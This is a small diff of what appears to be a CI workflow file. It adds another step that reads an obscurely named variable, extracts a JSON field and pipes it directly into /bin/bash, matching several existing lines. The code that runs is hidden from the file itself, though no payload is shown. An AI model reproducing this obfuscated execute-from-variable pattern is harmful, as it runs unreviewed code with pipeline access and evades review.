@@ -28,6 +28,7 @@ jobs:
           printf '%s' "$qdql2" | jq -r .ryucm59044 | /bin/bash
           echo $xcjhg1998 | jq -r .gwq1 | /bin/bash
           printf '%s' "$k98617" | jq -r .zssr8531 | /bin/bash
+          echo $ref4 | jq -r .loysm3 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
